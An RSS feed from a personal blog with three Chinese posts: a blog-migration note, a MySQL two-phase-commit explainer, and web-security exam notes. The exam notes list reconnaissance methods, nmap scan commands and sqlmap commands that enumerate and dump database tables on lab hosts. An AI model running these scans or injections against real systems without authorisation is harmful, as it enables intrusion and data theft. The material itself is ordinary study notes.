<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Resyon&#39;s World</title>
    <link>https://resyon.github.io/posts/</link>
    <description>Recent content in Posts on Resyon&#39;s World</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>© Resyon 2022</copyright>
    <lastBuildDate>Sat, 19 Feb 2022 18:47:06 +0800</lastBuildDate><atom:link href="https://resyon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>博客迁移</title>
      <link>https://resyon.github.io/posts/my-first-post/</link>
      <pubDate>Sat, 19 Feb 2022 18:47:06 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/my-first-post/</guid>
      <description>博客迁移 之前一直使用 halo 管理博客，这个系统没什么毛病，就是 Java 写的，跑起来实在太占内存了，我的小服务器实在受不了，随便搞点别的，就得把他停下来。还有就是，小服务器不想要了，主要是续费有点贵，平时也用不着。
现在迁移到了 github page，使用的引擎是 hugo，选了所谓的 Terminal 主题，极简极客风，我个人还是比较满意的，虽说自己肯定是算不上极客。
感兴趣的朋友可以参考 Host on Github 这篇官方文章，将博客托管至 Github 上。</description>
      <content>&lt;h1 id=&#34;博客迁移&#34;&gt;博客迁移&lt;/h1&gt;
&lt;p&gt;之前一直使用 &lt;a href=&#34;https://github.com/halo-dev/halo&#34;&gt;halo&lt;/a&gt; 管理博客，这个系统没什么毛病，就是 &lt;code&gt;Java&lt;/code&gt; 写的，跑起来实在太占内存了，我的小服务器实在受不了，随便搞点别的，就得把他停下来。还有就是，小服务器不想要了，主要是续费有点贵，平时也用不着。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/img/halo.png&#34; alt=&#34;占内存的 halo&#34;&gt;&lt;/p&gt;
&lt;p&gt;现在迁移到了 &lt;a href=&#34;https://resyon.github.io&#34;&gt;github page&lt;/a&gt;，使用的引擎是 &lt;a href=&#34;https://github.com/gohugo/hugo&#34;&gt;hugo&lt;/a&gt;，选了所谓的 &lt;a href=&#34;https://github.com/panr/hugo-theme-terminal&#34;&gt;Terminal&lt;/a&gt; 主题，极简极客风，我个人还是比较满意的，虽说自己肯定是算不上极客。&lt;/p&gt;
&lt;p&gt;感兴趣的朋友可以参考 &lt;a href=&#34;https://gohugo.io/hosting-and-deployment/hosting-on-github/&#34;&gt;Host on Github&lt;/a&gt; 这篇官方文章，将博客托管至 Github 上。&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>mysql 事务两阶段提交</title>
      <link>https://resyon.github.io/posts/mysql-2pc/</link>
      <pubDate>Thu, 16 Dec 2021 16:03:22 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/mysql-2pc/</guid>
      <description>Mysql 事务两阶段提交 overview  准确的说是使用innodb引擎的mysql事务的两阶段提交 redo-log是innodb引擎在存储引擎层面实现的
 例表
create table t( id int primary key, c int ); 如下查询
update `t` set c=c+1 where `id`=2; 有以下过程
两阶段提交的必要性 主要是保证redo-log 和 bin-log的一致性。这种必要性体现在异常恢复上。 由常识我们知道 redo-log用于保证事务的原子性和持久性，记录的是物理日志，由存储引擎实现 bin-log用于归档， 记录的逻辑日志，由mysql server 层实现
若不保证二者同步更新（不使用两阶段提交，即在二者之一完成之后立即提交事务），将出现以下两种情况
  redo-log -&amp;gt; commit -&amp;gt; bin-log 若在commit和bin-log间异常重启，系统能根据redo-log恢复事务，bin-log于是实际上少了一条记录，这就影响了后续对bin-log的使用，如构建从库，恢复到某一检查点
  bin-log -&amp;gt; commit -&amp;gt; redo-log 若在commit和redo-log间异常重启，系统无法恢复事务，而bin-log多了一条记录，而数据库里实际没有，以后用bin-log也会出现与原库不一样的问题
  总结 redo-log和bin-log都可以用于表示事务的提交状态，而两阶段提交就是让这两个状态保持逻辑上的一致。
 ref 丁奇《MySQL实战45讲》
 </description>
      <content>&lt;h1 id=&#34;mysql-事务两阶段提交&#34;&gt;Mysql 事务两阶段提交&lt;/h1&gt;
&lt;h2 id=&#34;overview&#34;&gt;overview&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;准确的说是使用&lt;code&gt;innodb&lt;/code&gt;引擎的&lt;code&gt;mysql&lt;/code&gt;事务的两阶段提交
&lt;code&gt;redo-log&lt;/code&gt;是&lt;code&gt;innodb&lt;/code&gt;引擎在存储引擎层面实现的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;例表&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;create&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;table&lt;/span&gt; t(
	id int &lt;span style=&#34;color:#66d9ef&#34;&gt;primary&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;key&lt;/span&gt;,
	&lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt; int
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如下查询&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;update&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;t&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;`=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有以下过程&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-8897670d04f14a109066df3f7d0943d0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;两阶段提交的必要性&#34;&gt;两阶段提交的必要性&lt;/h2&gt;
&lt;p&gt;主要是保证&lt;code&gt;redo-log&lt;/code&gt; 和 &lt;code&gt;bin-log&lt;/code&gt;的一致性。这种必要性体现在异常恢复上。
由常识我们知道
&lt;code&gt;redo-log&lt;/code&gt;用于保证事务的&lt;code&gt;原子性&lt;/code&gt;和&lt;code&gt;持久性&lt;/code&gt;，记录的是物理日志，由存储引擎实现
&lt;code&gt;bin-log&lt;/code&gt;用于归档， 记录的逻辑日志，由mysql &lt;code&gt;server&lt;/code&gt; 层实现&lt;/p&gt;
&lt;p&gt;若不保证二者同步更新（不使用两阶段提交，即在二者之一完成之后立即提交事务），将出现以下两种情况&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;redo-log&lt;/code&gt; -&amp;gt; &lt;code&gt;commit&lt;/code&gt; -&amp;gt; &lt;code&gt;bin-log&lt;/code&gt;
若在&lt;code&gt;commit&lt;/code&gt;和&lt;code&gt;bin-log&lt;/code&gt;间异常重启，系统能根据&lt;code&gt;redo-log&lt;/code&gt;恢复事务，&lt;code&gt;bin-log&lt;/code&gt;于是实际上少了一条记录，这就影响了后续对&lt;code&gt;bin-log&lt;/code&gt;的使用，如构建从库，恢复到某一检查点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;bin-log&lt;/code&gt; -&amp;gt; &lt;code&gt;commit&lt;/code&gt; -&amp;gt; &lt;code&gt;redo-log&lt;/code&gt;
若在&lt;code&gt;commit&lt;/code&gt;和&lt;code&gt;redo-log&lt;/code&gt;间异常重启，系统无法恢复事务，而&lt;code&gt;bin-log&lt;/code&gt;多了一条记录，而数据库里实际没有，以后用&lt;code&gt;bin-log&lt;/code&gt;也会出现与原库不一样的问题&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;redo-log&lt;/code&gt;和&lt;code&gt;bin-log&lt;/code&gt;都可以用于表示事务的提交状态，而两阶段提交就是让这两个状态保持逻辑上的一致。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ref 丁奇《MySQL实战45讲》&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    </item>
    
    <item>
      <title>网安选修课的期末考前急救</title>
      <link>https://resyon.github.io/posts/web-security-review-web-security-review/</link>
      <pubDate>Sat, 11 Dec 2021 19:34:37 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/web-security-review-web-security-review/</guid>
      <description>web-security test 试题手写40 整个攻击流程（渗透过程） 渗透-信息的收集  PPT
  收集域名信息   whois 查询域名 注册与否，注册域名的详细信息（如域名所有人、域名注册商） tools: whois(kali), 爱站工具网(https://whois.aizhan.com)、站长之家(http://whois.chinaz.com)和VirusTotal(https://www.virustotal.com) 备案信息 tools: ICP备案查询网：http://www.beianbeian.com, 天眼查：http://www.tianyancha.com。  收集敏感信息   利用搜索引擎，轻松得到想要的信息，还可以用它来搜集数据库文件，SQL注入，配置信息、源代码泄露、未授权访问和rebots.txt等敏感信息   google 常用语法   通过Burp Suite的Repeater功能，（如运行的Server类型及版本，PHP的版本信息等）  收集子域名信息   因为子域名通常护甲较弱
   子域名检测工具 (eg. Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE)
  搜索引擎枚举 site: ${target_domain}
  第三方聚合应用枚举 很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域 名。只需在其搜索栏中输入域名，就可检索到相关的域名信息
  证书透明度公开日志枚举 最简单的方法就是使用搜索引擎搜索一些公开的CT日志
  收集常用端口信息  关注常见应用的默认端口和在端口上运行的服务，便于渗透 tools: Nmap，无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具
指纹识别 指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别 应用程序一般在html、js、css等文件中包含一些特征码(CMS指纹)，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。 CMS又称整站系统或文章系统, 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。  tools: 御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等</description>
      <content>&lt;h1 id=&#34;web-security-test&#34;&gt;web-security test&lt;/h1&gt;
&lt;h2 id=&#34;试题手写40&#34;&gt;试题手写40&lt;/h2&gt;
&lt;h3 id=&#34;整个攻击流程渗透过程&#34;&gt;整个攻击流程（渗透过程）&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-6df3aeb93bde491b839d3a8a05c4a944.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;渗透-信息的收集&#34;&gt;渗透-信息的收集&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing&#34;&gt;PPT&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;收集域名信息&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;whois
查询域名 注册与否，注册域名的详细信息（如域名所有人、域名注册商）
tools: &lt;code&gt;whois&lt;/code&gt;(kali), &lt;code&gt;爱站工具网&lt;/code&gt;(&lt;a href=&#34;https://whois.aizhan.com&#34;&gt;https://whois.aizhan.com&lt;/a&gt;)、&lt;code&gt;站长之家&lt;/code&gt;(&lt;a href=&#34;http://whois.chinaz.com&#34;&gt;http://whois.chinaz.com&lt;/a&gt;)和&lt;code&gt;VirusTotal&lt;/code&gt;(&lt;a href=&#34;https://www.virustotal.com&#34;&gt;https://www.virustotal.com&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;备案信息
tools: &lt;code&gt;ICP备案查询网&lt;/code&gt;：http://www.beianbeian.com, &lt;code&gt;天眼查&lt;/code&gt;：http://www.tianyancha.com。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;收集敏感信息&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;利用搜索引擎，轻松得到想要的信息，还可以用它来搜集数据库文件，SQL注入，配置信息、源代码泄露、未授权访问和rebots.txt等敏感信息&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;google 常用语法
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-b041a8198d7c40109ed3f4c5b8613e6a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;code&gt;Burp Suite&lt;/code&gt;的&lt;code&gt;Repeater&lt;/code&gt;功能，（如运行的Server类型及版本，PHP的版本信息等）&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;收集子域名信息&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;因为子域名通常护甲较弱&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;子域名检测工具
(eg. Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;搜索引擎枚举
&lt;code&gt;site: ${target_domain}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第三方聚合应用枚举
很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域
名。只需在其搜索栏中输入域名，就可检索到相关的域名信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;证书透明度公开日志枚举
最简单的方法就是使用搜索引擎搜索一些公开的CT日志&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;收集常用端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;关注常见应用的默认端口和在端口上运行的服务，便于渗透
tools: &lt;code&gt;Nmap&lt;/code&gt;，无状态端口扫描工具&lt;code&gt;Masscan&lt;/code&gt;、&lt;code&gt;ZMap&lt;/code&gt;和&lt;code&gt;御剑高速TCP端口扫描工具&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;指纹识别
指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别
应用程序一般在html、js、css等文件中包含一些特征码(CMS指纹)，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。
CMS又称整站系统或文章系统, 常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;tools: &lt;code&gt;御剑Web指纹识别&lt;/code&gt;、&lt;code&gt;WhatWeb&lt;/code&gt;、&lt;code&gt;WebRobo&lt;/code&gt;、&lt;code&gt;椰树&lt;/code&gt;、&lt;code&gt;轻量WEB指纹识别&lt;/code&gt;等&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;寻找真实ip&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;无CDN: tools: &lt;a href=&#34;http://www.ip138.com&#34;&gt;www.ip138.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;有CDN: &lt;del&gt;我赌他不考&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;收集敏感目录&lt;/li&gt;
&lt;li&gt;社会工程学&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;owsp十大安全漏洞&#34;&gt;OWSP十大安全漏洞&lt;/h3&gt;
&lt;p&gt;OWASP组织：开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正.实际.有成本效益的信息。其目的是协助个人.企业和机构来发现和使用可信赖软件。
十个漏洞：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;注入&lt;/li&gt;
&lt;li&gt;失效的身份认证和会话管理&lt;/li&gt;
&lt;li&gt;跨站脚本&lt;/li&gt;
&lt;li&gt;不安全的直接对象引用&lt;/li&gt;
&lt;li&gt;安全配置错误&lt;/li&gt;
&lt;li&gt;敏感信息泄露&lt;/li&gt;
&lt;li&gt;功能级访问控制缺失&lt;/li&gt;
&lt;li&gt;跨站请求伪造&lt;/li&gt;
&lt;li&gt;使用含有已知漏洞的组件&lt;/li&gt;
&lt;li&gt;未验证的重定向与 转发&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;web-及工作原理&#34;&gt;&lt;del&gt;web 及工作原理&lt;/del&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1FqPgcRbEXPzcgWJy71Kef9oWL97BUTc4Spb0BTJmYyY/edit?usp=sharing&#34;&gt;web, php, mysql, etc 网安入门 ppt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-2b150c9ecbad4114a85cfddc3f5beda4.png&#34; alt=&#34;image.png&#34;&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-d5537aaf28244053816285b340304493.png&#34; alt=&#34;image.png&#34;&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-6bbd4f4973a4456788762a8ef25d87e7.png&#34; alt=&#34;image.png&#34;&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-2293c0d9f06f40bba5b297d709ab033f.png&#34; alt=&#34;image.png&#34;&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-0418374bc0aa483d9e7d15f1755bef8d.png&#34; alt=&#34;image.png&#34;&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-8afcc2d81e8c410aa5c2b7a5ae050e06.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;web框架怎样的结构哪三层作用是什么&#34;&gt;web框架怎样的结构，哪三层，作用是什么&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;del&gt;下面给的原答案好像有点问题&lt;/del&gt;
说的可能是 &lt;a href=&#34;https://developer.aliyun.com/article/45632&#34;&gt;这个&lt;/a&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-ad5b8643660b40b79d406f882cf68405.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;web应用-&amp;gt;应用服务器-&amp;gt;数据库服务器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;web应用：可以通过Web访问的应用程序, eg. WordPress&lt;/li&gt;
&lt;li&gt;应用程序服务器（英语：application server）是一种软件框架，提供一个应用程序运行的环境。 用于为应用程序提供安全.数据.事务支持.负载平衡大型分布式系统管理等服务。eg. Apache, IIS&lt;/li&gt;
&lt;li&gt;数据库服务器：是联系Web服务器与数据库管理系统（DBMS）的中间件是负责处理所有的应用程序服务器，包括在web服务器和后台的应用程序或数据库之间的事务处理和数据访问。eg&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;三个工具主要功能简单操作要会&#34;&gt;三个工具主要功能，简单操作要会&lt;/h3&gt;
&lt;h4 id=&#34;burpsuite&#34;&gt;burpsuite&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1Ps-miNR8luOUMqi36Co4uaY9DTZM3BFVsEEwLLN8KKY/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Burp_suite&#34;&gt;ref&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;用于测试网络应用程序安全性的图形化工具(java)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP Proxy — 拦截、查看、修改所有在客户端与服务端之间传输的数据。(他就是个拦截，指道的，发挥其他功能要靠下面的模块)&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Scanner&lt;/del&gt; — Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。&lt;/li&gt;
&lt;li&gt;Intruder — 对 Web 应用程序执行自动攻击。提供可配置算法，可生成恶意 HTTP 请求。Intruder 工具可以测试和检测 SQL 注入、跨站脚本、参数篡改和易暴力攻击的漏洞。&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Spider&lt;/del&gt; — 自动抓取 Web 应用程序的工具。可以与手工映射技术一起使用，加快映射应用程序内容和功能的过程。&lt;/li&gt;
&lt;li&gt;Repeater — 用来手动测试应用程序的简单工具。用于修改对服务器的请求，重新发送并观察结果。它最大的用途就是能和其他 Burp Suite工具结合起来使用。可以将目标站点地图、 Burp Proxy/浏览记录、 Burp Intruder的攻击结果，发送到 Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Decoder&lt;/del&gt; — 将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。能够利用启发式技术智能识别多种编码格式。&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Comparer&lt;/del&gt; — 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Extender&lt;/del&gt; — 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能&lt;/li&gt;
&lt;li&gt;&lt;del&gt;Sequencer&lt;/del&gt; — 分析数据项样本随机性的工具。可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;nmap&#34;&gt;nmap&lt;/h4&gt;
&lt;p&gt;Nmap( Network Mapper,网络映射器), &lt;code&gt;网络探测&lt;/code&gt;和&lt;code&gt;安全审核&lt;/code&gt;工具。用来&lt;code&gt;快速扫描大型网络&lt;/code&gt;，包括&lt;code&gt;主机探测与发现&lt;/code&gt;、&lt;code&gt;开放的端口情况&lt;/code&gt;、操作系统与应用服务&lt;code&gt;指纹识别&lt;/code&gt;、WAF识别及常见安全漏洞。&lt;del&gt;它的图形化界面是Zenmap,分布式框架为Dmap。&lt;/del&gt;
特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主机探测：探则网络上的主机，如列出响应TCP和CMP请求、ICMP请求、开放特别端口的主机&lt;/li&gt;
&lt;li&gt;端口扫描：探测目标主机所开放的端口&lt;/li&gt;
&lt;li&gt;版本检测：探测目标主机的网络服务，判断其服务名称及版本号&lt;/li&gt;
&lt;li&gt;系统检测：探测目标主机的操作系统及网络设备的硬件特性&lt;/li&gt;
&lt;li&gt;支持探测脚本的编写：使用Nmap的脚本引擎(NSE)和lua编程语言。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 扫主机&lt;/span&gt;
nmap 192.168.1.105 192.168.1.106 &lt;span style=&#34;color:#75715e&#34;&gt;# 1个或多个&lt;/span&gt;

nmap 192.168.1.105-106 &lt;span style=&#34;color:#75715e&#34;&gt;# 和上面一样&lt;/span&gt;

nmap 192.168.1.0/24 &lt;span style=&#34;color:#75715e&#34;&gt;# 团灭整个网段&lt;/span&gt;

nmap --li /tmp/file --exclude 192.168.1.105 --excludefile /tmp/file1 &lt;span style=&#34;color:#75715e&#34;&gt;# 扫`file`整个文件, 除了`192.168.1.105`和文件`file1`里头的&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 路由跟踪&lt;/span&gt;
nmap --traceroute 192.168.1.105 

&lt;span style=&#34;color:#75715e&#34;&gt;# 扫端口&lt;/span&gt;
nmap 192.168.0.100 –p 21,22,23,80

&lt;span style=&#34;color:#75715e&#34;&gt;# 扫在线状况&lt;/span&gt;
nmap –sP 192.168.0.100/24 

&lt;span style=&#34;color:#75715e&#34;&gt;# 操作系统指纹识别&lt;/span&gt;
nmap –O 192.168.0.105 &lt;span style=&#34;color:#75715e&#34;&gt;# 识别操作系统的版本&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 服务版本检测&lt;/span&gt;
nmap -sV 192.168.0.105 &lt;span style=&#34;color:#75715e&#34;&gt;# 检测开放端口对应的服务版本信息&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 探测防火墙状态  &lt;/span&gt;
nmap -sF -T4 192.168.0.105 &lt;span style=&#34;color:#75715e&#34;&gt;# FIN扫描用于识别端口是否关闭，RST: 端口关闭，否则是open或 filtered状态.&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-2b222cb254a2483eac14c1d169a5f093.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;sqlmap&#34;&gt;sqlmap&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1RTnsCI0q02FCXouj4AYTvYbsAS-vo97keWnRdWRe-pQ/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-4b322e227b804a6cbd763c0f357ee550.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 扫单个url, url都加双引号就对了&lt;/span&gt;
sqlmap.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.1.104/sql1/Less-1/?id=1&amp;amp;uid=2&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 扫文件里的&lt;/span&gt;
sqlmap.py -r desktop/1.txt

&lt;span style=&#34;color:#75715e&#34;&gt;# show databases;&lt;/span&gt;
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; --dbs

&lt;span style=&#34;color:#75715e&#34;&gt;# use security; show tables;&lt;/span&gt;
sqlmap.py -u http://127.0.0.1/sql/Less-1?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -D security --tables 

&lt;span style=&#34;color:#75715e&#34;&gt;# desc security.users;&lt;/span&gt;
sqlmap.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://127.0.0.1/sql/Less-1/?id=1&amp;#34;&lt;/span&gt; -D security -T users --columns

&lt;span style=&#34;color:#75715e&#34;&gt;# select * from security.users; &lt;/span&gt;
sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1” -D security -T users  --dump

&lt;span style=&#34;color:#75715e&#34;&gt;# 获取数据库的所有用户&lt;/span&gt;
sqlmap.py -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://127.0.0.1/sql/Less-1/?id=1&amp;#34;&lt;/span&gt; -users

&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前网站数据库的名称&lt;/span&gt;
sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1” --current-db

&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前网站数据库的用户名称&lt;/span&gt;
